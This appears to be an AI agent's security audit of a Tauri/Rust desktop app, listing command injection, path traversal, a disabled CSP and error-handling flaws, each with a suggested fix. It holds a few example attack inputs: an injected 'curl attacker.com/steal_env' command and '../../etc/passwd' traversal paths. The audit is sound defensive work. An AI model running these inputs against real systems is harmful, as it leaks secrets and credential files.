# Security & Error Handling Audit Report

**Auditor**: Agent 6 — Security Engineer
**Scope**: Full stack security review (frontend + backend), error handling robustness
**Overall Risk Level**: CRITICAL — Multiple injection vectors, CSP disabled

---

## Executive Summary

The Vantage codebase contains **3 CRITICAL command injection vulnerabilities**, a **disabled Content Security Policy**, and **multiple path traversal risks**. The application spawns processes, manages files, and integrates with external CLIs — all high-risk surfaces that currently lack adequate input validation. **Not suitable for production or multi-user deployment** in current state.

---

## Critical Findings (CWE-Classified)

### 1. CRITICAL: Command Injection — git show (CWE-78)
- **File**: git.rs:98
- **Issue**: `format!("{}:{}", git_ref, file_path)` passes unsanitized input to git
- **Attack**: Malicious `git_ref` with special characters could alter git command behavior
- **Fix**: Validate git refs match `^[0-9a-f]{7,40}$` or use `git rev-parse` first

### 2. CRITICAL: Command Injection — Quality Gates (CWE-78)
- **File**: merge_queue.rs:22-40
- **Issue**: User input passed directly to `cmd /C` (Windows) or `sh -c` (Unix)
- **Attack**: `command = "npm test && curl attacker.com/steal_env"`
- **Fix**: Use `shlex::parse()` to tokenize; pass individual args to `Command::new()`

### 3. CRITICAL: Command Injection — git diff (CWE-78)
- **File**: git.rs:322-345
- **Issue**: `format!("{}~1..{}", hash, hash)` with unsanitized hash parameter
- **Fix**: Validate hash is valid git object before use

### 4. HIGH: Command Injection — git tag (CWE-78)
- **File**: checkpoint.rs:143-149
- **Issue**: `agent_id` used in git tag name without validation
- **Fix**: Validate agent_id matches `^[a-zA-Z0-9/_.-]+$`

### 5. HIGH: CSP Disabled (CWE-693)
- **File**: tauri.conf.json:25-26
- **Issue**: `"csp": null` — no protection against XSS in WebView
- **Impact**: Claude responses, file contents, terminal output could inject scripts
- **Fix**: Enable CSP: `"default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'"`

### 6. HIGH: Unsafe `.unwrap()` in Production Path (CWE-252)
- **File**: plugins.rs:384
- **Issue**: `value.as_object_mut().unwrap()` can panic despite earlier type check
- **Fix**: Use `.ok_or_else()` with descriptive error

### 7. HIGH: Empty Promise Catch Blocks (CWE-391)
- **Files**: useFloatingWindow.ts:112, useFileTree.ts:171, TitleBar.tsx:11, PopoutEditor.tsx:74,76
- **Issue**: `.catch(() => {})` silently swallows errors
- **Fix**: Log errors and/or emit user-facing notifications

---

## Medium Findings

### 8. MEDIUM: No Path Traversal Protection (CWE-22)
- **File**: files/operations.rs — all functions
- **Issue**: No canonicalization, no bounds checking — `../../etc/passwd` accepted
- **Fix**: `path.canonicalize()` + verify within project root

### 9. MEDIUM: Symlinks Followed Without Validation (CWE-59)
- **File**: files/tree.rs:15,74,142
- **Issue**: `WalkBuilder` follows symlinks by default — potential directory escape and infinite loops
- **Fix**: Configure walker to not follow symlinks, or validate targets

### 10. MEDIUM: Unreliable Process Cleanup (CWE-404)
- **File**: claude/process.rs:369-379
- **Issue**: `try_lock()` may fail, `start_kill()` is async, `Drop` may not be called on abnormal exit
- **Fix**: Explicit shutdown + app-level process registry for cleanup on exit

### 11. MEDIUM: No WebView Sandbox (CWE-95)
- **File**: tauri.conf.json
- **Issue**: No isolation between UI code and user-supplied content (Claude responses, files, terminal)
- **Fix**: Use `<iframe sandbox>` for user content; use `textContent` over `innerHTML`

---

## Low Findings

### 12. LOW: .worktreeinclude Path Traversal (CWE-22)
- **File**: worktree.rs:338-369
- **Issue**: `../../secrets.json` in .worktreeinclude copies from outside project
- **Fix**: Validate paths are relative without `..`

### 13. LOW: Credential Logging Risk (CWE-532)
- **File**: analytics.rs
- **Issue**: Reads Claude session files from `~/.claude/projects/` which may contain sensitive data
- **Fix**: Document security model; redact sensitive fields before logging

### 14. LOW: Auto-Updater Disabled (TODO)
- **File**: lib.rs:607
- **Issue**: `tauri_plugin_updater` commented out — app stays on vulnerable versions indefinitely
- **Fix**: Enable once secure update endpoint is configured

---

## Summary Table

| # | Finding | File | Severity | CWE |
|---|---------|------|----------|-----|
| 1 | Command injection (git show) | git.rs:98 | CRITICAL | CWE-78 |
| 2 | Command injection (quality gates) | merge_queue.rs:32-40 | CRITICAL | CWE-78 |
| 3 | Command injection (git diff) | git.rs:324 | CRITICAL | CWE-78 |
| 4 | Command injection (git tag) | checkpoint.rs:143-149 | HIGH | CWE-78 |
| 5 | CSP disabled | tauri.conf.json:26 | HIGH | CWE-693 |
| 6 | Unsafe .unwrap() | plugins.rs:384 | HIGH | CWE-252 |
| 7 | Swallowed errors | Multiple (5 files) | HIGH | CWE-391 |
| 8 | No path traversal validation | files/operations.rs | MEDIUM | CWE-22 |
| 9 | Symlinks followed unsafely | files/tree.rs:74 | MEDIUM | CWE-59 |
| 10 | Unreliable process cleanup | claude/process.rs:369-379 | MEDIUM | CWE-404 |
| 11 | No WebView sandbox | tauri.conf.json | MEDIUM | CWE-95 |
| 12 | .worktreeinclude path traversal | worktree.rs:354-355 | LOW | CWE-22 |
| 13 | Credential logging risk | analytics.rs | LOW | CWE-532 |
| 14 | Auto-updater disabled | lib.rs:607 | LOW | N/A |

---

## Recommendations

### Immediate (Within 1 Sprint)
1. Fix 3 CRITICAL command injection vulnerabilities
2. Enable CSP in tauri.conf.json
3. Add path traversal validation to file operations
4. Replace swallowed `.catch(() => {})` with proper handlers

### Short Term (1-2 Sprints)
5. Validate all git refs and agent IDs against whitelists
6. Implement symlink policy
7. Redesign process cleanup with explicit shutdown
8. Add sandbox iframe for user content rendering

### Medium Term (1-2 Months)
9. Set up SAST in CI/CD
10. Conduct penetration testing on IPC and file operations
11. Add CSP reporting
12. Document threat model

### Ongoing
13. Secure coding guidelines
14. Security code review checklist
15. Regular dependency audits (npm audit, cargo audit)
